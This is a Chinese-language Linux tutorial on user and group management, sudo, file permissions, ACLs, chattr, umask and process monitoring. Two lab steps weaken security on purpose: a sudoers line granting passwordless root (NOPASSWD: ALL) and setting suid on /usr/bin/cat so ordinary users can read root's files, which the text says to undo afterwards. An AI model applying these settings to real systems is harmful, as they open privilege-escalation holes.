<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#修改用户密码</span></span></span><br><span class="line"></span><br><span class="line">方法一：root修改其他用户（alice）密码</span><br><span class="line">[root@qianfeng ~]# passwd alice</span><br><span class="line">方法二：用户（zhuzhu）登录，自己修改密码。</span><br><span class="line">[zhuzhu@qianfeng ~]$ passwd</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#组成员管理</span></span></span><br><span class="line"></span><br><span class="line">语法：usermod   -G  组名  用户名</span><br><span class="line">[root@qianfeng ~]# usermod  niuniu2 -G hr</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#其它选项管理</span></span></span><br><span class="line">修改登录SHELL</span><br><span class="line">[root@qianfeng ~]# usermod -s /sbin/nologin niuniu2</span><br></pre></td></tr></table></figure>

<p>用户组管理</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@qianfeng ~]# groupadd hr</span><br><span class="line">[root@qianfeng ~]# groupadd net01 -g 2000      //添加组net01，并指定gid 2000</span><br><span class="line">[root@qianfeng ~]# grep 'net01' /etc/group     //查看/etc/group中组net01信息</span><br><span class="line">[root@qianfeng ~]# groupdel net01   //删除组net01</span><br></pre></td></tr></table></figure>

<p>组分类</p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="center">释义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">基本组/主组</td>
<td align="center">随用户创建，自动创建的同名组。<br>有且仅有1个，显示在/etc/passwd</td>
</tr>
<tr>
<td align="center">附加组</td>
<td align="center">用户加入的其他组，可有多个</td>
</tr>
</tbody></table>
<p>操作示例</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">一、创建用户AAA，同时生成基本组AAA</span><br><span class="line">[root@QF ~]# useradd AAA</span><br><span class="line">[root@QF ~]# grep AAA /etc/passwd</span><br><span class="line">AAA:x:6001:6001::/home/AAA:/bin/bash</span><br><span class="line"></span><br><span class="line">二、创建组CCC</span><br><span class="line">[root@qf ~]# groupadd CCC</span><br><span class="line">[root@qf ~]# grep CCC /etc/group</span><br><span class="line">CCC:x:7001:</span><br><span class="line"></span><br><span class="line">三、修改用户AAA的基本组为CCC，查看passwd中，用户AAA的基本组是CCC</span><br><span class="line">[root@qf ~]# usermod  AAA   -g CCC</span><br><span class="line">[root@qf ~]# grep AAA /etc/passwd</span><br><span class="line">AAA:x:6001:7001::/home/AAA:/bin/bash</span><br><span class="line"></span><br><span class="line">四、修改用户BBB的附加组为CCC，查看group中用户BBB的附加组是CCC</span><br><span class="line">[root@qf ~]# usermod  BBB   -G CCC</span><br><span class="line">[root@qf ~]# grep CCC /etc/group</span><br><span class="line">CCC:x:7001:BBB</span><br></pre></td></tr></table></figure>

<h3 id="3-提权（了解）"><a href="#3-提权（了解）" class="headerlink" title="3.提权（了解）"></a>3.提权（了解）</h3><p><strong>永久提权</strong>Switching users with <strong>su</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[user01@localhost ~]$ id user01</span><br><span class="line">uid=1003(user01) gid=1003(user01) 组=1003(user01)</span><br><span class="line">[user01@localhost ~]$ whoami</span><br><span class="line">user01</span><br><span class="line">[alice@qianfeng ~]$ useradd u1</span><br><span class="line">-bash: /usr/sbin/useradd: 权限不够</span><br><span class="line">[alice@qianfeng ~]$ su - root</span><br><span class="line">password：</span><br><span class="line">[root@qianfeng ~]# useradd u1</span><br><span class="line">成功</span><br></pre></td></tr></table></figure>

<p><strong>临时提权</strong>Running commands as root with <strong>sudo</strong></p>
<p>sudo：当前用户切换到超级用户下,以超级用户身份执行命令，执行完成后，直接退回到当前用户。<br>        具体工作过程如下：<br>        当用户执行sudo时，系统会主动寻找/etc/sudoers文件，判断该用户是否有执行sudo的权限<br>        –&gt;确认用户具有可执行sudo的权限后，让用户输入用户自己的密码确认<br>        –&gt;若密码输入成功，则开始执行sudo后续的命令<br>        sudo配置文件语法：user    MACHINE=COMMANDS</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">目标：创建普通用户xulei，使其具有sudo特权</span><br><span class="line"></span><br><span class="line">示例</span><br><span class="line">1.以root身份授权普通用户xulei</span><br><span class="line">[root@qianfeng ~]# vim /etc/sudoers</span><br><span class="line"><span class="meta">%</span><span class="bash">wheel ALL=(ALL) NOPASSWD: ALL</span></span><br><span class="line">第99行：允许wheel用户组中的用户在不输入该用户的密码的情况下使用所有命令</span><br><span class="line">//或直接添加   xulei  ALL=(ALL) NOPASSWD:ALL</span><br><span class="line"></span><br><span class="line">[root@qianfeng ~]# useradd xulei -G wheel</span><br><span class="line">[root@qianfeng ~]# id xulei</span><br><span class="line">uid=504(xulei) gid=504(xulei) 组=504(xulei),10(wheel)</span><br><span class="line"><span class="meta">#</span><span class="bash"> passwd xulei</span></span><br><span class="line"></span><br><span class="line">2.切换用户xulei登陆</span><br><span class="line">[xulei@qianfeng ~]$ useradd gougou10</span><br><span class="line">-bash: /usr/sbin/useradd: 权限不够</span><br><span class="line">[xulei@qianfeng ~]$ sudo useradd gougou10</span><br><span class="line">[xulei@qianfeng ~]$ id gougou10</span><br><span class="line">uid=505(gougou10) gid=505(gougou10) 组=505(gougou10)</span><br></pre></td></tr></table></figure>

<h1 id="③Linux用户权限"><a href="#③Linux用户权限" class="headerlink" title="③Linux用户权限"></a>③Linux用户权限</h1><h2 id="一、基本权限UGO"><a href="#一、基本权限UGO" class="headerlink" title="一、基本权限UGO"></a>一、基本权限UGO</h2><table>
<thead>
<tr>
<th align="center">权限对象</th>
<th align="center">权限类型</th>
</tr>
</thead>
<tbody><tr>
<td align="center">属主： u</td>
<td align="center">读：r=4</td>
</tr>
<tr>
<td align="center">属组： g</td>
<td align="center">写：w=2</td>
</tr>
<tr>
<td align="center">其他人：o</td>
<td align="center">执行：x=1</td>
</tr>
<tr>
<td align="center">所有人：a(u+g+o)</td>
<td align="center">（左右不相关，分别为2个独立的表）</td>
</tr>
</tbody></table>
<h2 id="二、设置权限"><a href="#二、设置权限" class="headerlink" title="二、设置权限"></a>二、设置权限</h2><h3 id="1-更改权限chmod"><a href="#1-更改权限chmod" class="headerlink" title="1.更改权限chmod"></a>1.更改权限chmod</h3><p>语法： chmod   对象(u/g/o/a)赋值符(+/-/=)权限类型(r/w/x)    文件/目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 1.了解普通文件的基本权限</span></span></span><br><span class="line">[root@localhost tmp]# ll file1 </span><br><span class="line">-rw-r--r--. 1 root root 0 4月  13 20:49 file1</span><br><span class="line">权限           属主 属组                   文件</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 2.编写程序</span></span></span><br><span class="line">[root@localhost tmp]#vim    file1 </span><br><span class="line">echo    "hello 2020"</span><br><span class="line">read    -p     "请输入您的姓名："     name</span><br><span class="line">echo     "$name 是大笨蛋"</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 3.增加执行权限</span></span></span><br><span class="line">[root@localhost tmp]# chmod u+x file1   //属主增加执行</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 4.运行测试--成功</span></span></span><br><span class="line">[root@localhost tmp]# ./file1 </span><br><span class="line">hello 2020</span><br><span class="line">请输入您的姓名：4567</span><br><span class="line">4567 是大笨蛋</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 5.去除权限--运行失败</span></span></span><br><span class="line">[root@localhost tmp]# chmod u-x file1 </span><br><span class="line">[root@localhost tmp]# ./file1</span><br><span class="line">-bash: ./file1: 权限不够</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 6.更多的修改权限练习</span></span></span><br><span class="line">[root@localhost tmp]# chmod a=rwx file1   //所有人等于读写执行</span><br><span class="line">[root@localhost tmp]# chmod a=- file1     //所有人没有权限</span><br><span class="line">[root@localhost tmp]# chmod ug=rw,o=r file1     //属主属组等于读写，其他人只读</span><br><span class="line">[root@localhost tmp]# ll file1        //以长模式方式查看文件权限</span><br><span class="line">-rw-rw-r-- 1 alice it 17 10-25 16:45 file1      //显示的结果</span><br><span class="line">使用数字</span><br><span class="line">	4读   2写   1执行</span><br><span class="line">[root@localhost ~]# chmod 644 file1</span><br><span class="line">[root@localhost ~]# ll file1</span><br><span class="line">-rw-r--r-- 1 alice it 17 10-25 16:45 file1</span><br></pre></td></tr></table></figure>

<h3 id="2-更改属主chown、属组chgrp"><a href="#2-更改属主chown、属组chgrp" class="headerlink" title="2.更改属主chown、属组chgrp"></a>2.更改属主chown、属组chgrp</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chown： 设置一个文件属于谁，属主</span><br><span class="line">语法：  chown   用户名.组名   文件</span><br><span class="line">[root@localhost ~]# chown alice.hr file1  //改属主、属组</span><br><span class="line">[root@localhost ~]# chown alice file1     //只改属主</span><br><span class="line">[root@localhost ~]# chown .hr file1       //只改属组</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chgrp： 设置一个文件属于哪个组，属组</span><br><span class="line">语法：   chgrp   组名   文件      (-R是递归)</span><br><span class="line">[root@localhost ~]# chgrp it file1    //改文件属组</span><br><span class="line">[root@localhost ~]# chgrp -R it dir1  //改文件属组</span><br></pre></td></tr></table></figure>

<p><strong>案  例</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">针对hr部门的访问目录设置权限，要求如下：</span><br><span class="line"></span><br><span class="line">1. root用户和hr组的员工可以读、写、执行</span><br><span class="line">2. 其他用户没有任何权限</span><br><span class="line"></span><br><span class="line">操作思路：创建组--&gt;创建用户--&gt;修改属主和属组--&gt;设置权限</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#### 操作示范</span></span></span><br><span class="line"></span><br><span class="line">[root@localhost ~]# groupadd hr</span><br><span class="line">[root@localhost ~]# useradd hr01 -G hr</span><br><span class="line">[root@localhost ~]# useradd hr02 -G hr</span><br><span class="line">[root@localhost ~]# mkdir /home/hr</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# chgrp hr /home/hr</span><br><span class="line">[root@localhost ~]# chmod 770 /home/hr</span><br><span class="line">[root@localhost ~]# ll -d /home/hr/</span><br><span class="line">drwxrwx---. 2 root hr 4096 3月 13 14:26 /home/hr/</span><br></pre></td></tr></table></figure>

<h2 id="三、基本权限-ACL"><a href="#三、基本权限-ACL" class="headerlink" title="三、基本权限 ACL"></a>三、基本权限 ACL</h2><p>ACL文件权限管理： 设置不同用户，不同的基本权限(r、w、x)。对象数量不同。<br>        UGO设置基本权限： 只能一个用户，一个组和其他人</p>
<h3 id="1-语法"><a href="#1-语法" class="headerlink" title="1.语法"></a>1.语法</h3><p>setfacl     -m            u:alice:rw        /home/test.txt</p>
<p>命令       设置    用户/组:用户名:权限    文件对象</p>
<h3 id="2-用法"><a href="#2-用法" class="headerlink" title="2.用法"></a>2.用法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#设置,准备文件</span></span></span><br><span class="line">[root@qianfeng ~]# touch /home/test.txt</span><br><span class="line">[root@qianfeng ~]# ll /home/test.txt </span><br><span class="line">-rw-r--r-- 1 root root 0 10-26 13:59 /home/test.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 设置ACL</span></span></span><br><span class="line">查看文件有哪些ACL权限</span><br><span class="line">[root@qianfeng ~]# getfacl /home/test.txt</span><br><span class="line">设置用户alice,jack权限</span><br><span class="line">前提：创建alice 和jack用户。过程略</span><br><span class="line">[root@qianfeng ~]# setfacl -m u:alice:rw /home/test.txt</span><br><span class="line">[root@qianfeng ~]# setfacl -m u:jack:- /home/test.txt</span><br><span class="line">请思考命令中的o是什么作用?</span><br><span class="line">[root@qianfeng ~]# setfacl -m o::rw /home/test.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 查看/删除</span></span></span><br><span class="line">如何删除一条acl，如何删除所有acl呢？</span><br><span class="line">[root@qianfeng ~]# getfacl /home/test.txt</span><br><span class="line"></span><br><span class="line">[root@qianfeng ~]# setfacl -m g:hr:r /home/test.txt</span><br><span class="line">[root@qianfeng ~]# setfacl -x g:hr /home/test.txt //删除组hr的acl权限</span><br><span class="line">[root@qianfeng ~]# setfacl -b /home/test.txt //删除所有acl权限</span><br></pre></td></tr></table></figure>

<h2 id="四、特殊权限（了解）"><a href="#四、特殊权限（了解）" class="headerlink" title="四、特殊权限（了解）"></a>四、特殊权限（了解）</h2><h3 id="1-特殊位-suid"><a href="#1-特殊位-suid" class="headerlink" title="1.特殊位 suid"></a>1.特殊位 suid</h3><p>高级权限的类型</p>
<p>suid针对文件/程序时，具备临时获得属主的权限。</p>
<p>问题： 下面的操作，为什么会失败！</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# ll /root/file1.txt </span><br><span class="line">-rw-r--r-- 1 root root 4 7月  27 14:14 /root/file1.txt</span><br><span class="line">[root@localhost ~]#su - alice</span><br><span class="line">[alice@localhost ~]$ cat /root/file1.txt</span><br><span class="line">cat: /root/file1.txt: 权限不够</span><br><span class="line"></span><br><span class="line">分析：root运行是超管的权限，普通用户运行时是普通用户的权限。</span><br><span class="line">root      /usr/bin/cat (root)            /root/file1.txt          OK</span><br><span class="line">alice     /usr/bin/cat (alice)            /root/file1.txt</span><br></pre></td></tr></table></figure>

<p>示例———–设置suid，使普通用户通过suid临时提权，查看超管root用户的文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1.为cat程序添加上suid权限</span><br><span class="line">[root@qianfeng ~]# ll  /usr/bin/cat</span><br><span class="line">自习观察输出信息1</span><br><span class="line">[root@qianfeng ~]# chmod u+s /usr/bin/cat</span><br><span class="line">[root@qianfeng ~]# ll  /usr/bin/cat</span><br><span class="line">自习观察输出信息2（这两次有什么不同呢？）</span><br><span class="line"></span><br><span class="line">2.使用普通用户运行cat。暂时获得root权限</span><br><span class="line">[alice@qianfeng ~]$ cat /root/file1.txt</span><br><span class="line">请在试验后，将cat的suid权限除去。</span><br><span class="line">[root@qianfeng ~]# chmod u-s /usr/bin/cat</span><br><span class="line">[root@qianfeng ~]# ll  /usr/bin/cat</span><br><span class="line">自习观察输出信息3（请确认是否删除suid特殊权限）</span><br></pre></td></tr></table></figure>

<h3 id="2-文件属性chattr"><a href="#2-文件属性chattr" class="headerlink" title="2.文件属性chattr"></a>2.文件属性chattr</h3><p><strong>用途</strong>：常用于锁定某个文件，拒绝修改。</p>
<table>
<thead>
<tr>
<th align="center">属性分类</th>
<th align="center">释  义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">a</td>
<td align="center">Append Only，只允许在此文件之后追加数据，不允许覆盖或截断此文件。<br>若目录具有该属性，只允许在此目录下建立和修改文件，而不许删除任何文件</td>
</tr>
<tr>
<td align="center">i</td>
<td align="center">即Immutable，不允许对这个文件进行任何修改。若目录具有该属性，<br>只能修改目录之下的文件，不允许建立和删除文件</td>
</tr>
<tr>
<td align="center">A</td>
<td align="center">即Atime，告诉系统不要修改/更新此文件的最后访问时间</td>
</tr>
<tr>
<td align="center">S</td>
<td align="center">即Sync，一旦此文件执行了写操作，系统立刻把修改结果写到磁盘</td>
</tr>
<tr>
<td align="center">s</td>
<td align="center">彻底删除文件，不可恢复。因为是从磁盘上删除，用0填充文件所在区域</td>
</tr>
<tr>
<td align="center">c</td>
<td align="center">将文件或目录压缩后存放</td>
</tr>
<tr>
<td align="center">D</td>
<td align="center">检查压缩文件中的错误</td>
</tr>
<tr>
<td align="center">d</td>
<td align="center">在dump程序执行时，该文件或目录不会被dump备份</td>
</tr>
<tr>
<td align="center">u</td>
<td align="center">删除文件时，系统会保留其数据块，以便以后恢复。防止意外删除</td>
</tr>
<tr>
<td align="center">t</td>
<td align="center">文件系统支持尾部合并（tail-merging）</td>
</tr>
<tr>
<td align="center">X</td>
<td align="center">可以直接访问压缩文件的内容</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">参 数</th>
<th align="center">作  用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">-R</td>
<td align="center">递归处理，将指定目录下的所有文件及子目录一并处理</td>
</tr>
<tr>
<td align="center">-V</td>
<td align="center">显示指令执行过程</td>
</tr>
<tr>
<td align="center">-v&lt;版本编号&gt;</td>
<td align="center">设置文件或目录版本</td>
</tr>
<tr>
<td align="center">+&lt;属性&gt;</td>
<td align="center">开启文件或目录的该项属性</td>
</tr>
<tr>
<td align="center">-&lt;属性&gt;</td>
<td align="center">关闭文件或目录的该项属性</td>
</tr>
<tr>
<td align="center">=&lt;属性&gt;</td>
<td align="center">指定文件或目录的该项属性</td>
</tr>
</tbody></table>
<p>示例</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1 先创建新文件进行对比。查看默认权限</span><br><span class="line">[root@qianfeng ~]# touch file100</span><br><span class="line">[root@qianfeng ~]# lsattr file100</span><br><span class="line">-------------- file100</span><br><span class="line">2 加上不能删除的属性</span><br><span class="line">[root@qianfeng ~]# chattr +i file100 	//不能更改，重命名，删除</span><br><span class="line">3 查看不同属性</span><br><span class="line">[root@qianfeng ~]# lsattr file100</span><br><span class="line">----i--------- file100</span><br><span class="line">4 尝试删除</span><br><span class="line">[root@qianfeng ~]# rm -rf file100 </span><br><span class="line">rm: cannot remove `file100': Operation not permitted</span><br><span class="line">5 将属性还原</span><br><span class="line">[root@qianfeng ~]# chattr -i file100</span><br></pre></td></tr></table></figure>

<p><strong>注  意</strong></p>
<p>设置文件属性(特别权限)，针对所有用户，root是否会受到影响？答案是肯定的，会受到影响。</p>
<h3 id="3-进程掩码-umask"><a href="#3-进程掩码-umask" class="headerlink" title="3.进程掩码 umask"></a>3.进程掩码 umask</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">示例1: 观察系统默认掩码</span></span><br><span class="line">在shell进程中创建文件，先查看当前用户的umask权限</span><br><span class="line">[root@qianfeng ~]# umask 			</span><br><span class="line">0022</span><br><span class="line">[root@qianfeng ~]# touch file80</span><br><span class="line">[root@qianfeng ~]# mkdir dir80</span><br><span class="line">[root@qianfeng ~]# ll -d dir80 file80</span><br><span class="line">drwxr-xr-x. 2 root root 4096 3月  11 19:40 dir800</span><br><span class="line">-rw-r--r--. 1 root root    0 3月  11 19:40 file800</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">修改shell umask值（临时）</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">示例2：修改shell <span class="built_in">umask</span>值（临时）</span></span><br><span class="line">[root@qianfeng ~]# umask 000</span><br><span class="line">[root@qianfeng ~]# mkdir dir90</span><br><span class="line">[root@qianfeng ~]# touch file90</span><br><span class="line">[root@qianfeng ~]# ll -d dir90 file90</span><br><span class="line">drwxrwxrwx. 2 root root 4096 3月  11 19:44 dir900</span><br><span class="line">-rw-rw-rw-. 1 root root    0 3月  11 19:44 file900</span><br></pre></td></tr></table></figure>

<h1 id="④Linux进程管理"><a href="#④Linux进程管理" class="headerlink" title="④Linux进程管理"></a>④Linux进程管理</h1><h2 id="一、进程相关知识（了解）"><a href="#一、进程相关知识（了解）" class="headerlink" title="一、进程相关知识（了解）"></a>一、进程相关知识（了解）</h2><p><strong>1.进程定义</strong></p>
<p>进程是已启动的可执行程序的运行实例，是程序运行的过程， 动态，有生命周期及运行状态。</p>
<p>程序： 二进制文件，静态 /usr/bin/passwd ,/usr/sbin/useradd<br>​                </p>
<p><strong>2.进程的生命周期</strong></p>
<ul>
<li>父进程复制自己的地址空间（fork）创建一个新的（子）进程结构。</li>
</ul>
<ul>
<li>每个新进程分配一个，唯一的进程 ID （PID），满足跟踪安全性之需。</li>
</ul>
<ul>
<li>任何进程都可以创建子进程。</li>
</ul>
<ul>
<li><p>所有进程都是第一个系统进程的后代：</p>
<p>Centos5/6系统进程: init</p>
<p>Centos7系统进程: systemd</p>
</li>
</ul>
<p><strong>3.进程状态产生原因</strong></p>
<p>在多任务处理操作系统中，每个CPU（或核心）在一个时间点上只能处理一个进程。在进程运行时，它对CPU 时间和资源分配的要求会不断变化，从而为进程分配一个状态，它随着环境要求而改变。</p>
<h2 id="二、进程管理-process"><a href="#二、进程管理-process" class="headerlink" title="二、进程管理 process"></a>二、进程管理 process</h2><h3 id="1-静态查看进程-ps"><a href="#1-静态查看进程-ps" class="headerlink" title="1.静态查看进程 ps"></a>1.静态查看进程 ps</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@qianfeng ~]# ps aux |   head  -2</span><br><span class="line"></span><br><span class="line">USER  PID  %CPU  %MEM   VSZ    RSS   TTY  STAT  START  TIME     COMMAND</span><br><span class="line">root   1   0.0   0.6   128096  6708   ?    Ss   16:20  0:01  /usr/lib/systemd/systemd</span><br><span class="line">命令参数</span><br><span class="line">ps a  显示现行终端机下的所有程序 </span><br><span class="line">ps u   以用户为主的格式来显示程序状况。  </span><br><span class="line">ps x   不以终端机来区分。</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">ps aux 输出字段名</th>
<th align="center">含  义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">USER</td>
<td align="center">运行进程的用户</td>
</tr>
<tr>
<td align="center">PID</td>
<td align="center">进程ID</td>
</tr>
<tr>
<td align="center">%CPU</td>
<td align="center">CPU占用率</td>
</tr>
<tr>
<td align="center">%MEM</td>
<td align="center">内存占用率</td>
</tr>
<tr>
<td align="center">VSZ</td>
<td align="center">占用虚拟内存</td>
</tr>
<tr>
<td align="center">RSS</td>
<td align="center">占用实际内存</td>
</tr>
<tr>
<td align="center">TTY</td>
<td align="center">进程运行的终端类型（ ?代表本机打开，无终端 ）</td>
</tr>
<tr>
<td align="center">STAT</td>
<td align="center">进程状态（R运行，S睡眠，T停止，Z僵死，X已杀掉）</td>
</tr>
<tr>
<td align="center">START</td>
<td align="center">进程的启动时间</td>
</tr>
<tr>
<td align="center">TIME</td>
<td align="center">进程占用CPU的总时间</td>
</tr>
<tr>
<td align="center">COMMAND</td>
<td align="center">进程文件，进程名</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 1.进程排序</span></span></span><br><span class="line">ps aux --sort %cpu</span><br><span class="line"></span><br><span class="line">例：以CPU占比降序排列（减号是降序）</span><br><span class="line">[root@qianfeng ~]# ps aux --sort -%cpu</span><br><span class="line">[root@qianfeng ~]# ps aux --sort %cpu</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 2.进程的父子关系</span></span></span><br><span class="line">ps -ef</span><br><span class="line"></span><br><span class="line">例：查看进程的父子关系。 请观察PID和PPID</span><br><span class="line">[root@qianfeng ~]# ps -ef</span><br><span class="line">UID         PID   PPID  C STIME TTY          TIME CMD</span><br><span class="line">root          1      0  0 1月22 ?       00:00:07 /usr/lib/systemd/systemd </span><br><span class="line">root          2      0  0 1月22 ?       00:00:00 [kthreadd]</span><br><span class="line">root          3      2  0 1月22 ?       00:00:06 [ksoftirqd/0]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 3.自定义显示字段</span></span></span><br><span class="line"> ps axo</span><br><span class="line"> </span><br><span class="line">[root@qianfeng ~]# ps axo user,pid,ppid,%mem,command |head -3 </span><br><span class="line">root 8310 1 0.1 /usr/sbin/httpd</span><br><span class="line">apache 8311 8310 0.0 /usr/sbin/httpd</span><br><span class="line">apache 8312 8310 0.0 /usr/sbin/httpd</span><br></pre></td></tr></table></figure>

<h3 id="2-动态查看进程-top"><a href="#2-动态查看进程-top" class="headerlink" title="2.动态查看进程 top"></a>2.动态查看进程 top</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@qianfeng ~]# top</span><br><span class="line"></span><br><span class="line">top - 11:45:08 up 18:54,  4 users,  load average: 0.05, 0.05, 0.05</span><br><span class="line">Tasks: 176 total,   1 running, 175 sleeping,   0 stopped,   0 zombie</span><br><span class="line"><span class="meta">%</span><span class="bash">Cpu(s):  0.0 us,  0.3 sy,  0.0 ni, 99.7 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span></span><br><span class="line">KiB Mem :  3865520 total,  1100000 free,   580268 used,  2185252 buff/cache</span><br><span class="line">KiB Swap:  4063228 total,  4063228 free,        0 used.  2917828 avail Mem</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">每行名称</th>
<th align="center">释  义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">top</td>
<td align="center">从左到右依次为当前系统时间，系统运行的时间，系统在<br>之前1min、5min和15min内cpu的平均负载值</td>
</tr>
<tr>
<td align="center">Tasks</td>
<td align="center">该行给出进程整体的统计信息，包括统计周期内进程总数、运行状态进程数、<br>休眠状态进程数、停止状态进程数和僵死状态进程数</td>
</tr>
<tr>
<td align="center">Cpu(s)</td>
<td align="center">cpu整体统计信息，包括用户态下进程、系统态下进程占用cpu时间比，nice值大于0的进程在用户态下占用cpu时间比，cpu处于idle状态、wait状态的时间比，以及处理硬中断、软中断的时间比</td>
</tr>
<tr>
<td align="center">Mem</td>
<td align="center">内存统计信息，包括物理内存总量、已用内存、空闲内存<br>以及用作缓冲区的内存量（单位：K、M、G）</td>
</tr>
<tr>
<td align="center">Swap</td>
<td align="center">虚存统计信息，包括交换空间总量、已用交换区大小、空闲交换区大小<br>以及用作缓存的交换空间大小（单位：K、M、G）</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#字段介绍（了解）</span></span></span><br><span class="line"></span><br><span class="line">PID: 进程pid</span><br><span class="line">USER: 拉起进程的用户</span><br><span class="line">PR: 该列值加100为进程优先级，若优先级小于100，则该进程为实时(real-time)进程，否则为普通(normal)进程，实时进程的优先级更高，更容易获得cpu调度，以上输出结果中，java进程优先级为120，是普通进程，had进程优先级为2，为实时进程，migration 进程的优先级RT对应于0，为最高优先级</span><br><span class="line">NI: 进程的nice优先级值，该列中，实时进程的nice值为0，普通进程的nice值范围为-20~19</span><br><span class="line">VIRT: 进程所占虚拟内存大小（默认单位kB）</span><br><span class="line">RES: 进程所占物理内存大小（默认单位kB）</span><br><span class="line">SHR: 进程所占共享内存大小（默认单位kB）</span><br><span class="line">S: 进程的运行状态</span><br><span class="line"><span class="meta">%</span><span class="bash">CPU: 采样周期内进程所占cpu百分比</span></span><br><span class="line"><span class="meta">%</span><span class="bash">MEM: 采样周期内进程所占内存百分比</span></span><br><span class="line">TIME+: 进程使用的cpu时间总计</span><br><span class="line">COMMAND: 拉起进程的命令</span><br></pre></td></tr></table></figure>

<p><strong>top技巧</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">动态查看进程 top，像windows的任务管理器</span><br><span class="line">[root@qianfeng ~]# top          //回车，立刻刷新。按z彩色显示，按F，通过光标设置列的顺序。</span><br><span class="line">[root@qianfeng ~]# top -d 1     //每1秒刷新。</span><br><span class="line">[root@qianfeng ~]# top -d 1 -p 10126      //查看指定进程的动态信息</span><br><span class="line">[root@qianfeng ~]# top -d 1 -p 10126,1    //查看10126和1号进程</span><br></pre></td></tr></table></figure>

<h3 id="3-使用信号控制进程"><a href="#3-使用信号控制进程" class="headerlink" title="3.使用信号控制进程"></a>3.使用信号控制进程</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">给进程发送信号---<span class="built_in">kill</span></span></span><br><span class="line">[root@qianfeng ~]# kill -l     // 列出所有支持的信号</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">编 号</th>
<th align="center">信号名</th>
<th align="center">作  用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1)</td>
<td align="center">SIGHUP</td>
<td align="center">重新加载配置</td>
</tr>
<tr>
<td align="center">2)</td>
<td align="center">SIGINT</td>
<td align="center">键盘中断Ctrl+C</td>
</tr>
<tr>
<td align="center">3)</td>
<td align="center">SIGQUIT</td>
<td align="center">键盘退出Ctrl+\，类似SIGINT</td>
</tr>
<tr>
<td align="center"><strong>9)</strong></td>
<td align="center"><strong>SIGKILL</strong></td>
<td align="center"><strong>强制终止，无条件(杀死)</strong></td>
</tr>
<tr>
<td align="center"><strong>15)</strong></td>
<td align="center"><strong>SIGTERM</strong></td>
<td align="center"><strong>终止（正常结束），缺省信号</strong></td>
</tr>
<tr>
<td align="center">18)</td>
<td align="center">SIGCONT</td>
<td align="center">继续</td>
</tr>
<tr>
<td align="center">19)</td>
<td align="center">SIGSTOP</td>
<td align="center">暂停</td>
</tr>
<tr>
<td align="center">20)</td>
<td align="center">SIGTSTP</td>
<td align="center">键盘暂停Ctrl+Z</td>
</tr>
</tbody></table>
